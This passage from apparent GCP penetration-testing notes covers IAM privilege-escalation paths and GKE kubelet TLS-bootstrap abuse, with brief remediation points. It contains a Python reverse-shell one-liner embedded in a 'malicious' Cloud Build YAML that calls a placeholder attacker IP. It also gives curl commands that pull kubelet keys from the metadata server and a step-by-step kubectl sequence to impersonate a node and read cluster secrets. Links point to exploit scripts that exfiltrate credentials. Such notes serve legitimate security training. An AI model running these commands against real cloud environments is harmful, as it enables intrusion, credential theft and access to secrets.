href="https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/tree/master/ExploitScripts/CloudFunctions">Function zip file</a></p><ul id="5047a48e-cca1-403f-94b3-e49c747f5f5d" class="bulleted-list"><li style="list-style-type:disc">zip file is a function that retrieves access token from metadata</li></ul><p id="d5cc5911-62eb-4fd7-ab6a-7a7b2a0baaba" class="">
</p><p id="e6ffa7be-87a9-44d0-9dfb-2228cb1b8663" class=""><strong>Cloud Function Update</strong></p><ul id="4aa87c3f-09b7-4bac-b0b4-6cf701768dea" class="bulleted-list"><li style="list-style-type:disc">update an existing function</li></ul><p id="93c83e58-45b5-424e-82dd-82d7140574a1" class="">The following permissions are necessary:</p><ol type="1" id="29b45fed-22b6-40e5-8f4d-7db55165e3e0" class="numbered-list" start="1"><li><code>cloudfunctions.functions.sourceCodeSet</code></li></ol><ol type="1" id="9ed80cae-599b-4f17-ab71-6a0d34e4bb1f" class="numbered-list" start="2"><li><code>cloudfunctions.functions.update</code></li></ol><ol type="1" id="3ac4dac5-020e-447d-afd1-81b9f33bf6cd" class="numbered-list" start="3"><li><code>iam.serviceAccounts.actAs</code></li></ol><p id="a8b79cc9-109c-4049-9eaa-4ce196a556a1" class=""><a href="https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.update.py">Exploit Script</a></p><p id="9b4177e6-8186-4277-b5fa-e3937790005a" class="">
</p><p id="9b6e6555-4f00-4743-a924-3c98fd3e2361" class=""><strong>Compute Instance Create</strong></p><ul id="b3cdb494-5262-4269-a1bd-fd23b60fe372" class="bulleted-list"><li style="list-style-type:disc">create a Compute Engine using a high-privileged service account</li></ul><p id="fcc1ff34-5495-4d9d-8bbb-3e5db74bac87" class="">Necessary permissions:</p><ol type="1" id="af1eb00e-6594-4123-b262-42b889c017d2" class="numbered-list" start="1"><li><code>compute.disks.create</code></li></ol><ol type="1" id="d334d8c7-d46c-425e-88e5-7fbc47165316" class="numbered-list" start="2"><li><code>compute.instances.create</code></li></ol><ol type="1" id="313057eb-14e5-4a98-b783-95fa7ee7ec10" class="numbered-list" start="3"><li><code>compute.instances.setMetadata</code></li></ol><ol type="1" id="c5d90b08-2c7e-4f59-88be-937c1acbfe0f" class="numbered-list" start="4"><li><code>compute.instances.setServiceAccount</code></li></ol><ol type="1" id="72317352-dc4d-4da5-a81b-a7ecc7e2db7b" class="numbered-list" start="5"><li><code>compute.subnetworks.use</code></li></ol><ol type="1" id="373565c5-d6b1-4c5e-9c96-606b4764e339" class="numbered-list" start="6"><li><code>compute.subnetworks.useExternalIp</code></li></ol><ol type="1" id="2ac2ff85-7e32-476c-9af9-67b7caa87910" class="numbered-list" start="7"><li><code>iam.serviceAccounts.actAs</code></li></ol><p id="1f5ceae1-6fe1-4918-9c7a-af446d7348ea" class=""><a href="https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/compute.instances.create.py">Exploit Script</a></p><ul id="d1838c0e-7dc8-49c8-947e-ae20e1b99ea7" class="bulleted-list"><li style="list-style-type:disc">create instance then exfiltrates creds from metadata to a specified URL and port</li></ul><p id="a9843933-eb5e-4fe4-baab-92f458195ad7" class="">
</p><p id="852efe4a-f237-455d-94e2-bdd5f732f526" class=""><strong>Create Cloud Run Service</strong></p><ul id="c602a092-83c1-4533-b72c-084a5f27c2d2" class="bulleted-list"><li style="list-style-type:disc">service for building and deploying containerized apps </li></ul><ul id="b2782097-b8aa-4b1a-9f97-47de07cce904" class="bulleted-list"><li style="list-style-type:disc">create new cloud run service, invoke it, and get the access token from metadata service</li></ul><p id="b9b96e59-ad4c-4959-b954-6e9e671d280b" class="">Necessary permissions:</p><ol type="1" id="28f6d832-f8a8-4e26-bc72-99133083f920" class="numbered-list" start="1"><li><code>run.services.create</code></li></ol><ol type="1" id="8c962ed7-08b4-4767-9dd6-d16b1e47baea" class="numbered-list" start="2"><li><code>run.services.setIamPolicy</code> or <code>run.routes.invoke</code></li></ol><ol type="1" id="73378f2a-3a31-40bb-9083-d6ec4ae94638" class="numbered-list" start="3"><li><code>iam.serviceaccounts.actAs</code></li></ol><p id="a20bb134-dcd9-42c2-875c-058b7a992a7b" class=""><a href="https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/run.services.create.py">Exploit Script</a></p><p id="51d61ef7-e4c8-4275-b5af-7e850caf22cd" class=""><a href="https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/tree/master/ExploitScripts/CloudRunDockerImage">Docker Image</a></p><p id="3428528f-71d1-4e6c-88c2-809be23fa337" class="">
</p><p id="ca6fd296-69a3-458a-a453-c4ee2d494e21" class=""><strong>Create Cloud Scheduler Job</strong></p><ul id="ddce4c5e-8613-4a6c-9265-49375c099fda" class="bulleted-list"><li style="list-style-type:disc">cloud scheduler is a service for setting up cron jobs</li></ul><ul id="f061e25e-49ac-4fa1-bf0b-76464c5ab9c7" class="bulleted-list"><li style="list-style-type:disc">create a cron job that performs some task on the behalf of a higher-privileged service account<ul id="9abf3bb5-acbb-40fa-af24-820b221b9f4e" class="bulleted-list"><li style="list-style-type:circle">e.g. to create a new storage bucket:</li></ul><pre id="74a2a9fd-60da-4c9e-bc14-dacbdca69aab" class="code"><code>gcloud scheduler jobs create http test --schedule=&#x27;* * * * *&#x27; --uri=&#x27;https://storage.googleapis.com/storage/v1/b?project=&lt;PROJECT-ID&gt;&#x27; --message-body &quot;{&#x27;name&#x27;:&#x27;new-bucket-name&#x27;}&quot; --oauth-service-account-email high_priv-compute@developer.gserviceaccount.com --headers Content-Type=application/json</code></pre></li></ul><p id="5c71b109-481a-4c08-893a-387913c546cc" class="">Necessary permissions:</p><ol type="1" id="7e335714-36bf-4f46-a53a-dd506da2cbb8" class="numbered-list" start="1"><li><code>cloudscheduler.jobs.create</code></li></ol><ol type="1" id="6a7d233e-7f8a-4143-8bb6-5d5de42eca33" class="numbered-list" start="2"><li><code>cloudscheduler.locations.list</code></li></ol><ol type="1" id="bb879f18-faac-453a-89dd-9ad578b842d6" class="numbered-list" start="3"><li><code>iam.serviceAccounts.actAs</code></li></ol><p id="ef015240-5063-421f-a100-dd2249604c50" class="">
</p><h2 id="53689f6e-93f8-47ee-b7c7-b46774b59cb2" class="">Non-IAM</h2><p id="d5dbba83-196e-4281-a880-d13823c11eea" class=""><a href="https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-2">https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-2</a></p><h3 id="1c617f1a-7e2b-45b6-b927-15bd423fd729" class="">Orgpolicy Set</h3><p id="dfe22dbb-ecd5-4ca4-8e51-986b1fbe2efd" class=""><code>orgpolicy.policy.set</code></p><ul id="db093cf2-411b-4d2f-bd20-49b16ffed5e3" class="bulleted-list"><li style="list-style-type:disc">not a privesc technique, but can be used to disable constraints</li></ul><figure id="8bd8445f-ff9f-4b16-8c76-6eee97cc3d4c" class="image"><a href="../../../../images/GCP%20Penetration%20Testing%20Notes%202%20e0f928c1a83c48cf919cc74733148fcb/Untitled%202.png"><img style="width:1999px" src="../../../../images/GCP%20Penetration%20Testing%20Notes%202%20e0f928c1a83c48cf919cc74733148fcb/Untitled%202.png"/></a></figure><p id="7e43c299-0ef5-4e01-bcb3-2db1f4f08a9f" class=""><a href="https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/orgpolicy.policy.set.py">Exploit Script</a></p><h3 id="31ac0c8e-a412-478e-9d31-5f29abea6529" class="">Create HMAC Keys</h3><p id="d61dc576-ecd8-40dd-9b38-a1e573839416" class=""><code>storage.hmacKeys.create</code></p><ul id="607b31af-ae63-4bee-a781-125c47f03c7b" class="bulleted-list"><li style="list-style-type:disc">create HMAC key for higher-privileged service account</li></ul><p id="cfff2c1f-fec0-4c21-9ace-fae6bbecae60" class=""><code>gsutil hmac create &lt;SERVICE_ACCOUNT&gt;</code></p><ul id="af9ee216-1219-4b57-a4d7-f144574b14a4" class="bulleted-list"><li style="list-style-type:disc">returns access key and secret key</li></ul><p id="dcce3586-4b1d-4aae-bc8f-74e5b9da53b6" class=""><a href="https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/storage.hmacKeys.create.py">Exploit Script</a></p><h3 id="c8bd6f99-3195-49ef-b3f3-6de1c06337a5" class="">Create API Keys</h3><p id="19e0292d-4e7a-4692-8820-17fe3c7bb688" class=""><code>serviceusage.apiKeys.create</code></p><p id="5c519e72-57e0-4b67-88d3-9956f0b97c84" class=""><a href="https://cloud.google.com/docs/authentication/api-keys">https://cloud.google.com/docs/authentication/api-keys</a></p><ul id="3b28a9f2-06b2-4c24-96f2-a000d7aea906" class="bulleted-list"><li style="list-style-type:disc">When API keys are created, they can be used by any entity from anywhere by default<ul id="295adda1-3e26-4900-8acd-4e4b9d392971" class="bulleted-list"><li style="list-style-type:circle">API and application restrictions should be placed on API keys to restrict their usage to only be used by the intentional sources</li></ul></li></ul><figure id="ec235197-b450-4125-834b-5f99cabeb341" class="image"><a href="../../../../images/GCP%20Penetration%20Testing%20Notes%202%20e0f928c1a83c48cf919cc74733148fcb/Untitled%203.png"><img style="width:1999px" src="../../../../images/GCP%20Penetration%20Testing%20Notes%202%20e0f928c1a83c48cf919cc74733148fcb/Untitled%203.png"/></a></figure><p id="1cba0c12-c0f0-4298-b0ee-b7dcf952db4b" class=""><a href="https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/serviceusage.apiKeys.create.py">Exploit Script</a></p><h3 id="f5eaba1e-9c18-4252-8be5-e13bbc8c5d68" class="">List API keys</h3><p id="a9e5d672-8071-4f19-9930-124cae80de47" class=""><code>serviceusage.apiKeys.list</code></p><ul id="edc6023c-aa0c-4c22-9cd7-6e9f024eb58f" class="bulleted-list"><li style="list-style-type:disc">list API keys in project </li></ul><p id="a07067d8-eec4-4a54-91fd-17859b79f30b" class=""><code>gcloud services api-keys list</code></p><p id="3b6ed45e-b187-4612-a2b5-d3790dcc51ee" class=""><a href="https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/serviceusage.apiKeys.list.py">Exploit Script</a></p><h2 id="f881a99f-3de4-4aa8-99cd-db7d0b810d79" class="">Red Flag Permissions</h2><p id="f00de04a-4ea3-4ab8-99cf-30b0ed4c9303" class="">Can likely privesc if you have one of the following permissions </p><table id="8239867a-89c5-482a-9455-93c17ec2d21a" class="simple-table"><tbody><tr id="59f60d2f-842c-4970-96d4-c8658f2a8ecf"><td id=";pRl" class="" style="width:324.00000762939453px"><strong>Permission</strong></td><td id="kW|T" class="" style="width:377.00000762939453px"><strong>Description</strong></td></tr><tr id="5b1b8665-bd8e-461b-a84d-848602193c7d"><td id=";pRl" class="" style="width:324.00000762939453px"><code>resourcemanager.organizations.setIamPolicy</code></td><td id="kW|T" class="" style="width:377.00000762939453px">Attach IAM role to user in organization</td></tr><tr id="cfedf0ba-164a-4e73-88fd-726af8a4b797"><td id=";pRl" class="" style="width:324.00000762939453px"><code>resourcemanager.folders.setIamPolicy</code></td><td id="kW|T" class="" style="width:377.00000762939453px">Attach IAM role to user in folder</td></tr><tr id="066e19f0-7da8-44fa-a848-790b5088c460"><td id=";pRl" class="" style="width:324.00000762939453px"><code>resourcemanager.projects.setIamPolicy</code></td><td id="kW|T" class="" style="width:377.00000762939453px">Attach IAM role to user in project</td></tr><tr id="7ef45deb-23b8-479a-ab0a-b26f89e732b6"><td id=";pRl" class="" style="width:324.00000762939453px"><code>iam.serviceAccounts.setIamPolicy</code></td><td id="kW|T" class="" style="width:377.00000762939453px">Attach IAM role to user at service account level</td></tr><tr id="e427c9cb-d09e-4293-89d3-93277ac495d8"><td id=";pRl" class="" style="width:324.00000762939453px"><code>cloudfunctions.functions.setIamPolicy</code></td><td id="kW|T" class="" style="width:377.00000762939453px">Change policy of Cloud Function so that it can be invoked</td></tr><tr id="ae5aa35d-81bf-4000-97fa-3391292b0a7c"><td id=";pRl" class="" style="width:324.00000762939453px"><code>*.setIamPolicy</code></td><td id="kW|T" class="" style="width:377.00000762939453px">Can update policy for resource / asset within environment.</td></tr></tbody></table><h2 id="d8986773-7730-4dab-bf39-a105830fc186" class="">Google Storage</h2><p id="831a8ff3-11a5-46ac-96f5-d20d1b675bbb" class=""><a href="https://rhinosecuritylabs.com/gcp/google-cloud-platform-gcp-bucket-enumeration/">https://rhinosecuritylabs.com/gcp/google-cloud-platform-gcp-bucket-enumeration/</a></p><p id="3d73fe11-3514-4e19-8ed9-ee841fbf8c58" class="">
</p><ul id="8dd6876b-984e-4408-99e4-23ec6a938db6" class="bulleted-list"><li style="list-style-type:disc">Google version of AWS S3</li></ul><ul id="dac78be5-bece-4a6f-8f0d-a5babf706f83" class="bulleted-list"><li style="list-style-type:disc">S3 bucket = Google Storage bucket</li></ul><ul id="9489c154-173e-468e-bbf0-fb62c77d8987" class="bulleted-list"><li style="list-style-type:disc">buckets are private by default on creation</li></ul><h3 id="6acd39e8-49e5-4c43-aa92-8dc6c4988efa" class="">Enumeration</h3><ul id="ba613e61-dbfc-44b7-b440-316b16931453" class="bulleted-list"><li style="list-style-type:disc">faster to enumerate buckets by querying the HTTP endpoint than using <code>gsutil</code></li></ul><ul id="9aa6ba8a-5bf6-4f45-b2ca-f00945659bfd" class="bulleted-list"><li style="list-style-type:disc"><code>HEAD</code> requests made to <code>https://www.googleapis.com/storage/v1/b/&lt;BUCKET_NAME&gt;</code> endpoint<ul id="194c1b45-3f12-4b4a-86f6-1aa65cb250fa" class="bulleted-list"><li style="list-style-type:circle">nonexistent bucket if response is <code>404</code> or <code>400</code></li></ul></li></ul><ul id="41066549-278f-458c-86d6-96af5ef6a8e8" class="bulleted-list"><li style="list-style-type:disc">public listing of buckets occur when <code>storage.objects.list</code> is given to <code>allUsers</code><ul id="3eccf55e-87fc-4965-8ec8-5edfd0fed078" class="bulleted-list"><li style="list-style-type:circle"><code>allUsers</code> means anyone on the internet (both authenticated and unauthenticated)</li></ul></li></ul><ul id="e73a3dae-5c1e-4025-b8a1-8d26a2efc93d" class="bulleted-list"><li style="list-style-type:disc">permissions on a bucket can be found via the <code>TestIAMPermissions</code> API<ul id="8c711568-b903-43e9-94b0-6dee2b70b6e4" class="bulleted-list"><li style="list-style-type:circle"><code>https://www.googleapis.com/storage/v1/b/BUCKET_NAME/iam/testPermissions?permissions=&lt;PERMISSION&gt;</code> </li></ul><ul id="032bc443-cd54-4269-9b21-fcfca05268ad" class="bulleted-list"><li style="list-style-type:circle"><code>https://www.googleapis.com/storage/v1/b/BUCKET_NAME/iam/testPermissions?permissions=storage.buckets.delete&amp;permissions=storage.buckets.get&amp;permissions=storage.buckets.getIamPolicy&amp;permissions=storage.buckets.setIamPolicy&amp;permissions=storage.buckets.update&amp;permissions=storage.objects.create&amp;permissions=storage.objects.delete&amp;permissions=storage.objects.get&amp;permissions=storage.objects.list&amp;permissions=storage.objects.update</code></li></ul><ul id="43a9fec0-5296-410e-a129-476290dbc8eb" class="bulleted-list"><li style="list-style-type:circle">not all permissions will be listed as some are not specific to Google Storage (e.g. <code>resourcemanager.projects.list</code></li></ul></li></ul><ul id="ba864f55-a165-4b5d-9a3e-7cc558a6f793" class="bulleted-list"><li style="list-style-type:disc"><code>allAuthenticatedUsers</code> is any user on internet that has authenticated to Google Cloud (has potential for misconfiguration!)<ul id="c406b592-96a1-4e01-b0ba-f26c1808b4c2" class="bulleted-list"><li style="list-style-type:circle">From Google (<a href="https://cloud.google.com/iam/docs/overview">https://cloud.google.com/iam/docs/overview</a>): <code>Note: Consider using allUsers, as described on this page, rather than allAuthenticatedUsers. In many cases, granting access to all users is no more of a security risk than granting access only to authenticated users.</code></li></ul></li></ul><h3 id="8a5f17b8-d8ad-4a62-ba71-604b24c35b78" class="">Set Bucket Policy</h3><ul id="1296629f-e98d-4e80-a332-153262f1f7cf" class="bulleted-list"><li style="list-style-type:disc">can privesc to <code>storage.admin</code> if you can read the bucket policy (<code>storage.buckets.getIamPolicy</code>) and set the IAM policy (<code>storage.buckets.setIamPolicy</code> )<ul id="7ce3e5a4-e982-4123-aeb3-56556e34098d" class="bulleted-list"><li style="list-style-type:circle"><code>storage.buckets.getIamPolicy</code> is not necessary, but otherwise you risk overwriting the original policy (could lead to errors in environment)</li></ul></li></ul><p id="62dbfd57-6586-411f-927e-8b763c1758f2" class=""><strong>Privesc command</strong>: <code>gsutil ch group:&lt;YOUR_CURRENT_GROUP&gt;:admin gs://&lt;BUCKET&gt;</code></p><h2 id="d8dda75f-4f0d-4b2a-9519-08c575e4f5cf" class="">Cloud Build</h2><p id="87a9d28e-8d73-4c7c-9fb9-0baf598cb844" class=""><a href="https://rhinosecuritylabs.com/gcp/iam-privilege-escalation-gcp-cloudbuild/">https://rhinosecuritylabs.com/gcp/iam-privilege-escalation-gcp-cloudbuild/</a></p><ol type="1" id="e56ae395-872e-4726-82ad-b6de9efc7d86" class="numbered-list" start="1"><li>Provide code for Cloud Build which gets executed during build process (RCE)</li></ol><ol type="1" id="8456508d-bede-491d-9c8d-2cb4de8bbc6b" class="numbered-list" start="2"><li>Get access token for cloudbuild service account</li></ol><ul id="a71da9af-52bf-46de-af88-e2eda5356471" class="bulleted-list"><li style="list-style-type:disc">must have permission to start a new build to escalate privileges (<code>cloudbuild.builds.create</code>)</li></ul><p id="21f36746-fb2a-48cd-8755-d8e469b9e797" class=""><a href="https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudbuild.builds.create.py">Exploit Script</a></p><h3 id="c2e45ea2-978b-474c-a463-ee949940114c" class="">Methodology</h3><ul id="c2860bee-71ee-4f3a-b339-c1514f1900bd" class="bulleted-list"><li style="list-style-type:disc">create malicious <code>.yaml</code> file:</li></ul><pre id="bd1653c6-4385-471a-a01c-982a70a23da0" class="code"><code>steps:
- name: &#x27;python&#x27;
  entrypoint: &#x27;python&#x27;
  args:
  - -c
  - import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;IP-ADDRESS&quot;,PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);</code></pre><p id="9139a8f3-0e77-4746-85c5-14a10e8ad377" class="">Run the following command:<code>gcloud builds submit --config ./build.yaml .</code></p><p id="fecb48b0-96d9-41aa-8f9b-0aa18807b923" class="">Then, read <code>/root/tokencache/gsutil_token_cache</code> to get Cloud Build service account token</p><ul id="f2d9de1d-832d-41cc-a0ce-abf1d0cdb46e" class="bulleted-list"><li style="list-style-type:disc">check scope of token here: <code>https://www.googleapis.com/oauth2/v3/tokeninfo?access_token=</code></li></ul><h2 id="13e2543e-3243-4f07-8f62-043825d22715" class="">Remediation</h2><ul id="fe4c11f6-4e86-432b-8479-63c48bf864fa" class="bulleted-list"><li style="list-style-type:disc">don’t provide <code>cloudbuild.build.create</code> unless you’re okay with the permissions the Cloud Build service account grants</li></ul><ul id="c3695813-16e9-4cdb-9ded-0a25f5894309" class="bulleted-list"><li style="list-style-type:disc">consider reducing the permissions for the CloudBuild service account </li></ul><h2 id="840dac61-b3a2-4b39-b570-624f777a44fe" class="">GKE</h2><p id="7e6da1c0-25ee-4681-b7dd-811ad9a1ca9b" class=""><a href="https://www.4armed.com/blog/hacking-kubelet-on-gke/">https://www.4armed.com/blog/hacking-kubelet-on-gke/</a></p><p id="a0710017-17f9-4fbe-83fa-82c6700cc599" class=""><a href="https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/">https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/</a></p><h3 id="966e2403-98cb-4a82-8682-ee10fa58a37b" class="">Kubernetes Threat Matrix</h3><p id="61136762-6902-464d-8453-05c657c1d577" class=""><a href="https://www.microsoft.com/en-us/security/blog/2020/04/02/attack-matrix-kubernetes/">https://www.microsoft.com/en-us/security/blog/2020/04/02/attack-matrix-kubernetes/</a></p><figure id="569df3ee-fee4-461c-8e85-f0201bc7e40e" class="image"><a href="../../../../images/GCP%20Penetration%20Testing%20Notes%202%20e0f928c1a83c48cf919cc74733148fcb/Untitled%204.png"><img style="width:1440px" src="../../../../images/GCP%20Penetration%20Testing%20Notes%202%20e0f928c1a83c48cf919cc74733148fcb/Untitled%204.png"/></a></figure><h2 id="e7867a49-98c8-467f-9188-173a02219099" class="">Kubelet</h2><p id="6d78c86f-5665-43af-8853-db79810ab651" class="">Retrieve <code>apiserver.crt</code>, <code>kubelet.crt</code>, and <code>kubelet.key</code></p><pre id="207bcfe6-8575-485c-ac22-c0f20a9f35d1" class="code"><code>curl -s -H &#x27;Metadata-Flavor: Google&#x27; &#x27;http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env&#x27; | grep ^KUBELET_CERT | awk &#x27;{print $2}&#x27; | base64 -d &gt; kubelet.crt
curl -s -H &#x27;Metadata-Flavor: Google&#x27; &#x27;http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env&#x27; | grep ^KUBELET_KEY | awk &#x27;{print $2}&#x27; | base64 -d &gt; kubelet.key
curl -s -H &#x27;Metadata-Flavor: Google&#x27; &#x27;http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env&#x27; | grep ^CA_CERT | awk &#x27;{print $2}&#x27; | base64 -d &gt; apiserver.crt</code></pre><ul id="439dd44d-d320-4b9b-865f-67f25885e698" class="bulleted-list"><li style="list-style-type:disc">use <code>$KUBERNETES_PORT_443_TCP_ADDR</code> env variable to find Kubernetes master IP address</li></ul><h3 id="8ac29e0d-a112-4dcc-9754-ebbdf5ca7133" class="">TLS Bootstrapping</h3><p id="6a08ef56-a822-4b66-93f1-7c8b6a6f9b88" class="">TLS bootstrap privesc steps:</p><figure id="76e8dcf5-a630-401d-a3f6-21b24ec4cc20" class="image"><a href="../../../../images/GCP%20Penetration%20Testing%20Notes%202%20e0f928c1a83c48cf919cc74733148fcb/Untitled%205.png"><img style="width:2528px" src="../../../../images/GCP%20Penetration%20Testing%20Notes%202%20e0f928c1a83c48cf919cc74733148fcb/Untitled%205.png"/></a></figure><ul id="c283b55a-eab4-46fd-8822-20eb4c33cca8" class="bulleted-list"><li style="list-style-type:disc">creds give permissions to the <code>CertificateSigningRequest</code> object</li></ul><p id="d7f2dc1a-ed19-48a6-90ad-3d97bd4e2124" class="">List certificate signing request (CSRs) for cluster nodes:</p><pre id="dda53816-c85f-4614-a736-88d6813a17c8" class="code"><code>kubectl --client-certificate kubelet.crt --client-key kubelet.key --certificate-authority apiserver.crt --server https://${KUBERNETES_PORT_443_TCP_ADDR} get certificatesigningrequests</code></pre><p id="c258b10f-0fd9-4639-9c1e-839378555cd0" class="">Obtain client certificate that kubelet uses for its normal functions:</p><pre id="e868790e-6f04-4229-87dc-520508f4f62d" class="code"><code>kubectl --client-certificate kubelet.crt --client-key kubelet.key --certificate-authority apiserver.crt --server https://${KUBERNETES_PORT_443_TCP_ADDR} get certificatesigningrequests &lt;NODE_NAME&gt; -o yaml</code></pre><ul id="52dc0299-0c45-4a15-987a-d902d012bb61" class="bulleted-list"><li style="list-style-type:disc">in the output of this command, the certificate is in the <code>status.certificate</code> field (base64 encoded)</li></ul><p id="f5558cdb-8236-4687-a0aa-6aa53078eea9" class="">Base64 decode client certificate:</p><pre id="646393e9-4ff9-4194-bb59-7711feab050e" class="code"><code>kubectl --client-certificate kubelet.crt --client-key kubelet.key --certificate-authority apiserver.crt --server https://${KUBERNETES_PORT_443_TCP_ADDR} get certificatesigningrequests &lt;NODE_NAME&gt; -o jsonpath=&#x27;{.status.certificate}&#x27; | base64 -d &gt; node.crt</code></pre><ul id="c8150a42-9ee8-4bfc-99cf-ab1270146ad9" class="bulleted-list"><li style="list-style-type:disc">cannot yet get pod with client certificate cause the private key rotates every time before a new CSR is created (using <code>LoadOrGenerateKeyFile</code> function)</li></ul><ul id="04d257c1-7698-4881-b946-ba94a2363b8c" class="bulleted-list"><li style="list-style-type:disc">must create own key, generate CSR, and submit the CSR and key</li></ul><p id="3d3ccb12-134d-47b7-a1cd-45dc5ea1f057" class=""><strong><strong><strong><strong>Become a Node</strong></strong></strong></strong></p><p id="8bae69f2-a62f-4fbf-acd1-73c4973560c2" class="">Create private key:</p><pre id="1c834dff-c7f5-4cc2-a76e-358adff6dea0" class="code"><code>openssl req -nodes -newkey rsa:2048 -keyout k8shack.key -out k8shack.csr -subj &quot;/O=system:nodes/CN=system:node:&lt;NODE_NAME&gt;&quot;</code></pre><ul id="2d4ee9d5-e391-4bda-8e30-87cd0ab832ce" class="bulleted-list"><li style="list-style-type:disc">note that you can specify the node name and it will work because Kubernetes has no restrictions for which certificates a node can request</li></ul><p id="9ae61ef3-bf62-498e-8d0a-eca143a0d991" class="">Submit key to API:</p><pre id="c5ecf4a8-452f-4f60-8a46-3d96cd431d2c" class="code"><code>cat &lt;&lt;EOF | kubectl --client-certificate kubelet.crt --client-key kubelet.key --certificate-authority apiserver.crt --server https://${KUBERNETES_PORT_443_TCP_ADDR} create -f -
apiVersion: certificates.k8s.io/v1beta1
kind: CertificateSigningRequest
metadata:
  name: node-csr-$(date +%s)
spec:
  groups:
  - system:nodes
  request: $(cat k8shack.csr | base64 | tr -d &#x27;\n&#x27;)
  usages:
  - digital signature
  - key encipherment
  - client auth
EOF</code></pre><p id="166da50c-7b82-45a7-b783-c60d17eb1b2c" class="">Get pod:</p><pre id="f20c0538-60c2-471c-99f2-e7cdfc97fe1a" class="code"><code>kubectl --client-certificate kubelet.crt --client-key kubelet.key --certificate-authority apiserver.crt --server https://${KUBERNETES_PORT_443_TCP_ADDR} get csr &lt;NODE_NAME&gt;</code></pre><p id="3f1df48d-a0c3-46f5-9b41-5a01a8df98a0" class="">Get certificate:</p><pre id="152d1245-4a2b-446c-9f03-c67ae01f8107" class="code"><code>kubectl --client-certificate kubelet.crt --client-key kubelet.key --certificate-authority apiserver.crt --server https://${KUBERNETES_PORT_443_TCP_ADDR} get csr &lt;NODE_NAME&gt; -o jsonpath=&#x27;{.status.certificate}&#x27; | base64 -d &gt; node2.crt</code></pre><p id="8e50cfad-4b08-4f66-af08-d299d64a8a28" class="">Access API server:</p><pre id="b071f33e-5441-4127-88b2-bd23ccbe599c" class="code"><code>kubectl --client-certificate node2.crt --client-key k8shack.key --certificate-authority apiserver.crt --server https://${KUBERNETES_PORT_443_TCP_ADDR} get pods -o wide</code></pre><ul id="6226f57f-d049-492d-8b0f-878a9a06c725" class="bulleted-list"><li style="list-style-type:disc">following the steps above provide access to API as <code>system:nodes</code> group</li></ul><ul id="5c93fbfd-f12f-4f9d-8e4a-fcf11e799b4e" class="bulleted-list"><li style="list-style-type:disc"><code>system:nodes</code> group allows pod scheduling and viewing secrets<ul id="5ad8f418-ac27-4ab2-ae5d-ca75fdcc8900" class="bulleted-list"><li style="list-style-type:circle">note that you can get secrets, but you can’t list them</li></ul></li></ul><ul id="90dcf980-baf8-4495-9802-5b4314be5455" class="bulleted-list"><li style="list-style-type:disc">secret names can be found from pod spec:</li></ul><pre id="8a6c8e02-6946-444e-a893-7a72564911b8" class="code"><code>kubectl --client-certificate node2.crt --client-key k8shack.key --certificate-authority apiserver.crt --server https://${KUBERNETES_PORT_443_TCP_ADDR} get pod &lt;POD_NAME&gt; -o yaml</code></pre><p id="8f1c05e7-416e-4744-ad5a-88aeb1ab09dd" class="">Get secret:</p><pre id="d98b18af-8f5b-4a46-8fac-cfb38e3c7583" class="code"><code>kubectl --client-certificate node2.crt --client-key k8shack.key --certificate-authority apiserver.crt --server https://${KUBERNETES_PORT_443_TCP_ADDR} get secret &lt;SECRET_NAME&gt; -o yaml</code></pre><ul id="cac42873-6ccd-4a24-87e2-df8c19958c9d" class="bulleted-list"><li style="list-style-type:disc">secret is base64 encoded</li></ul><ul id="378ee134-d8cc-4c39-a911-d574c3b2212c" class="bulleted-list"><li style="list-style-type:disc">if the secret contains a token, you can use it in <code>kubectl</code> with the <code>--token</code> flag, for example:</li></ul><pre id="e610ebd6-a8d1-4b15-ab25-d8f4f63c56f4" class="code"><code>kubectl --certificate-authority ca.crt --token &lt;TOKEN&gt; --server https://&lt;MASTER_IP&gt; get all</code></pre><ul id="a2b042e0-de5e-4c5c-b685-b2e7661ed185" class="bulleted-list"><li style="list-style-type:disc">check if you can access other pods using <code>exec</code></li></ul><h3 id="1bd8546f-1b78-417a-83f5-3a4eca6917f8" class="">Service Account Token</h3><p id="346d314b-a2dc-4198-b1e9-82fdb85efc11" class="">Service account token in one of the following locations: </p><p id="4734cbc9-3bfe-4762-b6ab-c3a39c2f8dec" class=""><code>/var/run/secrets/kubernetes.io/serviceaccount/token</code> or <code>/run/secrets/kubernetes.io/serviceaccount/token</code></p><h3 id="c4cd63e9-2199-46f1-a5cd-e9ba3e962936" class="">Mitigations</h3><p id="a1b25da9-5461-45d1-a00d-4a87ead7db3b" class=""><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>Metadata Concealment</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p><ul id="6ff448fd-57d1-4092-bf43-664387051007" class="bulleted-list"><li style="list-style-type:disc">hide <code>kube-env</code> value<p id="f268b298-24b8-4059-8c8f-ceda61fad5ec" class="">(see the <a href="https://cloud.google.com/kubernetes-engine/docs/how-to/protecting-cluster-metadata">official Google Cloud document</a> for Kubernetes metadata protection)</p></li></ul><ul 